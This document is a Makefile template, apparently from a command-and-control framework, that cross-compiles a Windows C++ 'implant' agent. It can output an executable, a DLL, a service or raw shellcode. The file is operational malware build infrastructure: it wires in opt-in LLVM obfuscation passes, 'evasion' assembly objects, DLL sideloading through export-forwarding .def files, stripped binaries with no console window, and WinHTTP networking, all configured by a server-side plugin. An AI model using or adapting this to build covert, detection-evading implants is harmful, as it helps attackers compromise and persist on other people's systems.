# __NAME__ Agent — C++ Implant Build (MinGW-w64)
#
# Usage:
#   make all         Build all architectures (default format: exe)
#   make FORMAT=dll  Build as DLL
#   make FORMAT=svc  Build as Windows service
#

SRC_DIR  := $(CURDIR)
BEACON   := __NAME__

# MinGW cross-compilers
CXX_X64  := x86_64-w64-mingw32-g++
CXX_X86  := i686-w64-mingw32-g++

# ── LLVM obfuscation (opt-in) ────────────────────────────────────────────────────────
# Set LLVM_COMPILER to the compiler binary (absolute path or name in PATH).
# Set LLVM_FLAGS for obfuscation passes (e.g. -mllvm -irobf-indbr ...).
# Set LLVM_TARGET for cross-compilation target (e.g. x86_64-w64-mingw32).
LLVM_COMPILER ?=
LLVM_FLAGS    ?=
LLVM_TARGET   ?=

ifneq ($(LLVM_COMPILER),)
    CXX_X64 := $(LLVM_COMPILER)
    CXX_X86 := $(LLVM_COMPILER)
    # clang++ may not link libstdc++ by default; add it explicitly
    LLVM_CXX_LIBS := -lstdc++
    ifneq ($(LLVM_TARGET),)
        CXXFLAGS += --target=$(LLVM_TARGET)
    endif
endif

ifeq ($(OS),Windows_NT)
HAS_X64  := $(strip $(shell where $(CXX_X64) 2>nul))
HAS_X86  := $(strip $(shell where $(CXX_X86) 2>nul))
else
HAS_X64  := $(strip $(shell command -v $(CXX_X64) 2>/dev/null))
HAS_X86  := $(strip $(shell command -v $(CXX_X86) 2>/dev/null))
endif
ALL_TARGETS :=

ifneq ($(HAS_X64),)
ALL_TARGETS += x64
endif

ifneq ($(HAS_X86),)
ALL_TARGETS += x86
endif

ifeq ($(OS),Windows_NT)
CLEAN_CMD := powershell -NoProfile -Command "Remove-Item -Force '$(BEACON)_x64*','$(BEACON)_x86*','$(BEACON)_svc*','evasion\*_x64.o','evasion\*_x86.o','*_x64.o','*_x86.o' -ErrorAction SilentlyContinue"
else
CLEAN_CMD := rm -f $(BEACON)_x64* $(BEACON)_x86* $(BEACON)_svc* evasion/*_x64.o evasion/*_x86.o *_x64.o *_x86.o
endif

# Format selection: exe | dll | svc | shellcode
FORMAT   ?= exe

# Common flags (modeled on beacon_agent)
CXXFLAGS := -std=c++17 -Os -fno-stack-protector -fno-strict-overflow \
            -fno-delete-null-pointer-checks -fno-strict-aliasing \
            -fno-builtin -fno-exceptions -fno-unwind-tables \
            -fno-asynchronous-unwind-tables -fpermissive -w \
            -ffunction-sections -fdata-sections \
            -masm=intel -fPIC -I $(SRC_DIR) -I $(SRC_DIR)/impl -I $(SRC_DIR)/protocol -I $(SRC_DIR)/crypto

LDFLAGS  := -s -Wl,-s,--gc-sections -static-libgcc -static-libstdc++ -mwindows
DEFINES  :=

# Append LLVM obfuscation flags when compiler is set
ifneq ($(LLVM_FLAGS),)
    CXXFLAGS += $(LLVM_FLAGS)
endif

# Sideloading: path to .def file for export forwarding (set by plugin)
DEFFILE  ?=

# Extra defines injected by server-side plugin (e.g. -DDEBUG -DIAT_DISABLED)
EXTRA_DEFINES ?=

# Debug builds use console subsystem (no -mwindows) so stdout goes to the
# calling terminal — matches the Rust agent behavior.
ifneq ($(findstring -DDEBUG,$(EXTRA_DEFINES)),)
    LDFLAGS := $(filter-out -mwindows,$(LDFLAGS))
endif

# Profile header (injected by server-side plugin at build time)
PROFILE_HEADER ?=
ifneq ($(PROFILE_HEADER),)
    CXXFLAGS += -include $(PROFILE_HEADER)
endif

ifeq ($(FORMAT),dll)
    DEFINES += -DBUILD_DLL -D_WIN32_WINNT=0x0600
    LDFLAGS += -shared
    ifneq ($(DEFFILE),)
        LDFLAGS += $(DEFFILE)
    endif
    EXT_X64  = _x64.dll
    EXT_X86  = _x86.dll
else ifeq ($(FORMAT),svc)
    DEFINES += -DBUILD_SVC
    EXT_X64  = _svc_x64.exe
    EXT_X86  = _svc_x86.exe
else ifeq ($(FORMAT),shellcode)
    DEFINES += -DBUILD_SHELLCODE
    EXT_X64  = _x64.bin
    EXT_X86  = _x86.bin
else
    EXT_X64  = _x64.exe
    EXT_X86  = _x86.exe
endif

# Source files
SOURCES := $(wildcard impl/*.cpp) crypto/crypto.cpp protocol/protocol.cpp config.cpp main.cpp
# __EVASION_SOURCES__

# Assembly sources (GAS syntax, Intel mode) — no-op when no .S files exist
ASM_SOURCES   := $(wildcard evasion/*.S)
BOOTSTRAP_ASM := $(wildcard *.S)
ASM_OBJS_X64  := $(ASM_SOURCES:.S=_x64.o) $(BOOTSTRAP_ASM:.S=_x64.o)
ASM_OBJS_X86  := $(ASM_SOURCES:.S=_x86.o) $(BOOTSTRAP_ASM:.S=_x86.o)

.PHONY: all x64 x86 clean

all: $(ALL_TARGETS)

# ASM compilation rules (pattern rules — no-op when no .S files exist)
evasion/%_x64.o: evasion/%.S
	$(CXX_X64) -c -masm=intel -o $@ $<

evasion/%_x86.o: evasion/%.S
	$(CXX_X86) -c -masm=intel -o $@ $<

%_x64.o: %.S
	$(CXX_X64) -c -masm=intel -o $@ $<

%_x86.o: %.S
	$(CXX_X86) -c -masm=intel -o $@ $<

x64: $(ASM_OBJS_X64)
	@echo "[*] Building $(BEACON) x64 ($(FORMAT))..."
	$(CXX_X64) $(CXXFLAGS) $(DEFINES) $(EXTRA_DEFINES) $(LDFLAGS) -o $(BEACON)$(EXT_X64) $(SOURCES) $(ASM_OBJS_X64) -lws2_32 -lwinhttp $(LLVM_CXX_LIBS)
	@echo "[+] $(BEACON)$(EXT_X64)"

x86: $(ASM_OBJS_X86)
	@echo "[*] Building $(BEACON) x86 ($(FORMAT))..."
	$(CXX_X86) $(CXXFLAGS) $(DEFINES) $(EXTRA_DEFINES) $(LDFLAGS) -o $(BEACON)$(EXT_X86) $(SOURCES) $(ASM_OBJS_X86) -lws2_32 -lwinhttp $(LLVM_CXX_LIBS)
	@echo "[+] $(BEACON)$(EXT_X86)"

clean: ; @$(CLEAN_CMD)
